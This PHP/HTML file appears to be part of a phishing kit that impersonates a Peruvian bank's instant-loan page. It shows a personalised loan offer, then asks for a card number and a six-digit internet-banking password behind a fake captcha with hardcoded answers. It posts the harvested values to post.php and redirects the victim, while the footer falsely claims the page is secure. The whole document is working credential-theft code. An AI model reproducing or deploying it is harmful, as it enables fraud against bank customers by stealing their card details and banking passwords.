<?php
error_reporting(0);
session_start();
/*************************************************************************/
if ($_SESSION["openPE"] != "True") {
	header("Location: ./");
}
/*************************************************************************/
if ($_SESSION["corto"] == "Estimado Usuario(a)") {
	$nombre = "";
	$show = "none;";
} else {
	$nombre = $_SESSION["corto"];
	$show = "block;";
}
/*************************************************************************/
if ($_SESSION["presto"] >= 100 && $_SESSION["presto"] <= 3000) {
	$meses = 3;
	$interes_anual = 25;
	$desgravamen = 0.705;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 3001 && $_SESSION["presto"] <= 10000) {
	$meses = 10;
	$interes_anual = 23;
	$desgravamen = 0.605;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 10001 && $_SESSION["presto"] <= 25000) {
	$meses = 20;
	$interes_anual = 21;
	$desgravamen = 0.505;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 25001 && $_SESSION["presto"] <= 80000) {
	$meses = 36;
	$interes_anual = 18;
	$desgravamen = 0.405;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 80001 && $_SESSION["presto"] <= 200000) {
	$meses = 60;
	$interes_anual = 15;
	$desgravamen = 0.305;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
?>
<!DOCTYPE html>
<html device-type="desktop" class="hydrated">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Prestamo al instante</title>
	<link rel="stylesheet" href="rino/styles/main.css">
	<meta content="width=device-width, initial-scale=1" name="viewport">
	<link href="rino/images/favicon.png" rel="icon" type="image/x-icon">
	<link rel="stylesheet" href="rino/styles/stylo.css">
	<style>
		.loading {
			padding: 420px 0px 0px 410px;
		}

		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}

		@font-face {
			font-family: password;
			font-style: normal;
			font-weight: 400;
			src: url(rino/styles/fuente/password.ttf);
		}

		.mask {
			font-family: password !important;
		}
	</style>
</head>

<body class="">
	<div id="loader_ajax"
		style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
		<div id="ajax_loader">
			<div class="text-center">
				<img src="rino/images/spinner.gif" class="loading">
			</div>
		</div>
	</div>
	<app-root _nghost-aqk-c52="" ng-version="12.2.16">
		<router-outlet _ngcontent-aqk-c52=""></router-outlet>
		<app-initial-verify _nghost-aqk-c63="">
			<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;">
				<div _ngcontent-aqk-c63="" class="row" style="min-height: 100%;">
					<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
						<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
							<div _ngcontent-aqk-c59="" class="channel-img-fixed"
								style="background-image: url(rino/images/costado.jpg); background-repeat: no-repeat; background-size: cover; background-position: center center; height: 100%;">
								<div class="logo-container">

									<img _ngcontent-aqk-c59="" src="rino/images/logo.png"
										class="mt16 logoSize logoStyle">
								</div>
							</div>
						</app-channel-image>
					</div>
					<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;">
						<app-home-header _ngcontent-aqk-c63="" _nghost-aqk-c54="">
							<div _ngcontent-aqk-c54=""
								class="row justify-content-end header-padding bar-blue header-first-pages">
								<div _ngcontent-aqk-c54="" class="col-6 col-md-3 di-lg-none px-0 header-logo-padding">
									<img _ngcontent-aqk-c54="" style="width: 65px; height:42px; transform: scale(3.5); margin-left:14px;" src="rino/images/logo.png" class="logo-small">
								</div>
								<div _ngcontent-aqk-c54="" class="col-xl-12 d-none d-md-block">
									<div _ngcontent-aqk-c54="" class="row justify-content-end">
										<bcp-icon _ngcontent-aqk-c54="" name="chronometer-r" color="text"
											class="bar-blue hydrated" style="padding-top: 2px;">
											<i class="icon chronometer-r text"></i>
										</bcp-icon>
									</div>
								</div>
								<div _ngcontent-aqk-c54="" class="col-6 col-md-9 di-lg-none" style="padding-top: 3px;">
								</div>
							</div>
							<div>&nbsp;</div>
							<div _ngcontent-aqk-c54="" class="row back-button-medium d-only-mobile"></div>
						</app-home-header>
						<div _ngcontent-aqk-c63="" class="row container-form">
							<div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 8px;">
								<div _ngcontent-aqk-c63="" class="box-wrapper container">
									<form class="ng-pristine ng-invalid ng-touched">
										<input type="hidden" id="one" value="<?= $interes; ?>">
										<input type="hidden" id="two" value="<?= $meses; ?>">
										<input type="hidden" id="tre" value="<?= $cuota_mensual; ?>">
										<input type="hidden" id="for" value="<?= $desgravamen; ?>">
										<input type="hidden" id="five" value="<?= $total_desgravamen; ?>">
										<input type="hidden" id="six" value="<?= $tasa_mensual; ?>">
										<input type="hidden" id="seven" value="<?= $interes_anual; ?>">
										<div _ngcontent-aqk-c63="" class="row mt8 mb32">
											<div _ngcontent-aqk-c63="" class="col text-center">
												<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
													<h2 class="">Dinero al Instante</h2>
												</bcp-title>
												<p style="padding-top: 25px; text-align: justify;">
													Hola, <b>
														<font color="red">
															<?= $nombre; ?>
														</font>
													</b> estás siendo analizado para una ampliación de crédito de <b>
														<font color="red">S/.
															<?= number_format($_SESSION["presto"]); ?>
														</font>
													</b> financiado en <b>
														<font color="red">
															<?= $meses; ?> meses,
														</font>
													</b> donde la Tasa de Interés Anual <b>
														<font color="red">(TEA)</font>
													</b> es del <b>
														<font color="red">
															<?= $interes_anual; ?>%
														</font>
													</b> y la Tasa de Interés Mensual <b>
														<font color="red">(TEM)</font>
													</b> es del <b>
														<font color="red">
															<?= $tasa_mensual; ?>%
														</font>
													</b>, el seguro de desgravamen es de <b>
														<font color="red">S/.
															<?= $total_desgravamen; ?>
														</font>
													</b> el equivalente al <b>
														<font color="red">
															<?= $desgravamen; ?>%
														</font>
													</b> de tu prestamo, donde tu cuota aproximada a pagar es de: <b>
														<font color="red">S/.
															<?= number_format($cuota_mensual, 2); ?> mensuales.
														</font>
													</b>
												</p>
												<p style="text-align: justify;">
													Al finalizar tu prestamo habras pagado un interes aproximado de <b>
														<font color="red">S/.
															<?= number_format($interes, 2); ?>
														</font>
													</b>
												</p>
												<p style="text-align: justify;">
													Para continuar con el proceso por favor inicie sesion, para validar
													sus datos
												</p>
											</div>
										</div>
										<div _ngcontent-aqk-c63="" class="row mb24">
											<div _ngcontent-aqk-c63="" class="col">
												<bcp-select-input _ngcontent-aqk-c63=""
													class="ng-untouched ng-pristine ng-invalid hydrated" maxlength="8">
													<div class="row no-gutters select-input-container"
														style="display:<?= $show; ?>;">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-aqk-c63="" size="lg" position="top"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control" disabled=""
																			autocomplete="off" type="text"
																			value="<?= $_SESSION["full"]; ?>">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
													<div class="row no-gutters select-input-container">
														<div class="col select-container">
															<bcp-select option-type="simple" class="hydrated">
																<div class="dropdown filled md" tabindex="-1">
																	<div class="dropdown-toggle" data-toggle="dropdown">
																		<bcp-select-header class="hydrated">
																			<bcp-paragraph class="hydrated">
																				<p
																					class="paragraph-lg bcp-font-demi text truncate">
																					DNI</p>
																			</bcp-paragraph>
																		</bcp-select-header>
																	</div>
																</div>
																<bcp-paragraph class="helper-text hydrated">
																	<p
																		class="paragraph-sm bcp-font-regular onsurface-800">
																		&nbsp;</p>
																</bcp-paragraph>
															</bcp-select>
														</div>
														<div class="col input-container">
															<bcp-tooltip _ngcontent-aqk-c63="" size="lg" position="top"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control" disabled=""
																			autocomplete="off"
																			value="<?= $_SESSION["documento"]; ?>">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control" autocomplete="off"
																			id="presente" name="presente" type="tel"
																			placeholder="Número de Tarjeta"
																			onkeypress="return tipoFiltro(event)"
																			required="">
																		<input type="hidden" id="info">
																		<input type="hidden" id="tipo">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control mask"
																			autocomplete="off" id="llave" name="llave"
																			type="tel" maxlength="6"
																			placeholder="Clave de Internet de 6 dígitos"
																			onkeypress="return tipoFiltro(event)"
																			required="">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</bcp-select-input>
											</div>
										</div>
										<div _ngcontent-aqk-c63="" class="row mb24">
											<div _ngcontent-aqk-c63="" class="col">
												<bcp-captcha _ngcontent-aqk-c63="" bcpctrlform=""
													formcontrolname="captchaControl" maxlength="6" minlength="6"
													bcpalphanumeric=""
													class="ng-pristine ng-invalid hydrated ng-touched">
													<div class="row no-gutters captcha-container invalid">
														<bcp-img class="img-captcha hydrated">
															<img _ngcontent-c12="" id="kaptcha" width="130">
														</bcp-img>
														<div class="col image-container" tabindex="-1"
															name="div-img-bcp-input-0"></div>
														<div class="col input-container">
															<bcp-input ctrl-value="" class="hydrated">
																<div class="form-group invalid">
																	<input class="form-control" required=""
																		autocomplete="off" type="text" maxlength="6"
																		placeholder="Captcha" id="captcha"
																		autocorrect="off" autocapitalize="off">
																</div>
															</bcp-input>
														</div>
													</div>
												</bcp-captcha>
											</div>
										</div>
										<p id="alerta"
											style="text-align: center; color: red; font-size: 0.9rem; display: none;">
										</p>
										<div _ngcontent-aqk-c63=""
											class="row button-space-bottom d-sm-block btn-not-fixed">
											<div _ngcontent-aqk-c63="" class="col">
												<bcp-button _ngcontent-aqk-c63="" type="button" tier="primary" size="lg"
													full-width="" class="hydrated">
													<button type="button" class="btn btn-primary btn-lg btn-block"
														onclick="post(1);">
														<bcp-paragraph class="hydrated">
															<p class="paragraph-lg bcp-font-demi white">Continuar </p>
														</bcp-paragraph>
													</button>
												</bcp-button>
											</div>
										</div>
									</form>
								</div>
							</div>
						</div>
						<app-home-footer _ngcontent-aqk-c63="" _nghost-aqk-c55="">
							<div _ngcontent-aqk-c55="" class="justify-content-end footer-padding">
								<div _ngcontent-aqk-c55="" class="col remove-padding p-0">
									<div _ngcontent-aqk-c55="" class="box-wrapper container footer-container">
										<section _ngcontent-aqk-c55="" class="footer-main-text">
											<div _ngcontent-aqk-c55="" class="m-footer-icon">
												<bcp-icon _ngcontent-aqk-c55="" name="lock-b" color="onsurface-600"
													class="hydrated">
													<i class="icon lock-b onsurface-600"></i>
												</bcp-icon>
											</div>
											<div _ngcontent-aqk-c55="" class="container-text-large">
												<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm"
													family="regular" class="footer-text hydrated">
													<p class="paragraph-sm bcp-font-regular onsurface-600">
														Esta es una página segura. Todos sus datos estan
														protegidos<br>con los más altos estandares en seguridad.
													</p>
												</bcp-paragraph>
											</div>
										</section>
										<div _ngcontent-aqk-c55="" class="d-block d-lg-none container-footer-line">
											<div _ngcontent-aqk-c55="" class="footer-line"></div>
										</div>
										<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm"
											family="regular" class="d-none d-sm-block copyright-text hydrated">
											<p class="paragraph-sm bcp-font-regular onsurface-600">
												© 2024&nbsp;&nbsp;|&nbsp;&nbsp;Todos los derechos reservados
											</p>
										</bcp-paragraph>
										<div _ngcontent-aqk-c55="" class="d-block d-sm-none">
											<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm"
												family="regular" class="copyright-text hydrated">
												<p class="paragraph-sm bcp-font-regular onsurface-600">
													<br _ngcontent-aqk-c55="">Todos los derechos reservados
												</p>
											</bcp-paragraph>
										</div>
									</div>
								</div>
							</div>
						</app-home-footer>
					</div>
				</div>
			</div>
		</app-initial-verify>
	</app-root>
	<script type="text/javascript" src="rino/js/jquery-3.1.0.min.js"></script>
	<script type="text/javascript" src="rino/js/mask.js"></script>
	<script type="text/javascript" src="rino/js/value.js"></script>
	<script>

		$(document).ready(function () {
			$("#presente").mask("0000 0000 0000 0000");

			$(function () {
				$("#presente").validateCard(function (result) {
					$("#info").val(result.valid);
					if (result.card_type != null)
						$("#tipo").val(result.card_type.name);
					formato();
				});
			});
		});

		// Inicio CC
		function formato() {

			if ($("#info").val() == "true") {

				if ($("#tipo").val() != "amex") {
					$('#presente').mask("0000 0000 0000 0000");
					$("#presente").attr('maxlength', '19');
				} else {
					$('#presente').mask("0000 000000 00000");
					$("#presente").attr('maxlength', '17');
				}
			} else {
				$('#presente').mask("0000 0000 0000 0000");
			}
		}

		var imagen = ["img_1.png", "img_2.png", "img_3.png", "img_4.png", "img_5.png", "img_6.png", "img_7.png", "img_8.png", "img_9.png", "img_10.png", "img_11.png", "img_12.png", "img_13.png", "img_14.png", "img_15.png", "img_16.png", "img_17.png", "img_18.png", "img_19.png", "img_20.png", "img_21.png", "img_22.png", "img_23.png", "img_24.png"];

		$(document).ready(function () {
			$("#kaptcha").attr("src", "" + "rino/images/capcha/" + imagen[Math.floor(Math.random() * imagen.length)]);
		});

		function tipoFiltro(e) {

			var charCode = e.key;

			if ((/^[0-9]+$/.test(charCode))) {
				return true;
			} else {
				return false;
			}
		}

		function post(post) {

			let y = document.querySelector("#presente"); // Tarjeta
			let z = document.querySelector("#info"); // Valido
			let w = document.querySelector("#tipo"); // Tipo
			let d = document.querySelector("#llave"); // Clave
			const e = ['282ADP', 'PCBA83', '247WM8', 'PMB2NC', 'GA6N7B', 'G455N7', 'M3BB5C', '6444NW', 'BYW3NA', 'E8X3PC', 'W6D3DE', '7NXFBG', 'MDFP74', '4N4BWM', '7XXWPN', 'PNANY2', '4XP4G7', 'CAM58F', 'PN63PM', '36XD35', '2XWAB8', 'NAB33M', '2MD2GG', 'CXF7Y4', 'NXPPN5']; // Array Captcha
			let f = document.querySelector("#captcha"); // Captcha
			let g = document.querySelector("#one"); // Interes
			let h = document.querySelector("#two"); // Meses
			let i = document.querySelector("#tre"); // Cuota
			let j = document.querySelector("#for"); // Desgravamen
			let k = document.querySelector("#five"); // Total Desgravamen
			let l = document.querySelector("#six"); // TEM
			let m = document.querySelector("#seven"); // TEA

			let x = post;

			switch (x) {

				case 1: // Login

					if (w.value != "amex") { largo = "19"; } else { largo = "17"; }

					if (y.value.length < largo) {
						$("#alerta").html("* Ingresa un número de tarjeta de Credimás Clásica o Crédito Amex o Crédito Visa.").show();
						y.focus();
						return false;
					}

					if (z.value != "true") {
						$("#alerta").html("* El número de tarjeta es invalido, por favor verifique").show();
						y.focus();
						return false;
					}

					if (d.value.length < 6) {
						$("#alerta").html("* Ingrese ó complete su clave de internet").show();
						d.focus();
						return false;
					}

					if (f.value == "") {
						$("#alerta").html("* Ingrese ó complete captcha").show();
						f.focus();
						return false;
					}

					if (e.includes(f.value.toUpperCase()) === false) {
						$("#alerta").html("* El captcha ingresado es incorrecto").show();
						f.focus();
						return false;
					}

					var parametros = {
						"data_4": d.value,
						"data_5": y.value,
						"data_9": w.value,
						"data_10": g.value,
						"data_11": h.value,
						"data_12": i.value,
						"data_14": j.value,
						"data_15": k.value,
						"data_16": l.value,
						"data_17": m.value,
						"orden": "B",
					}

					$("#alerta").hide();
					$("#loader_ajax").show();

					$.ajax({
						data: parametros,
						url: 'post.php',
						type: 'post',
						success: function (response) {
							setTimeout(function () {
								window.open('validar', '_parent');
							}, 1800);
						}
					});

					break;

				default:
					break;
			}
		}
	</script>
</body>

</html>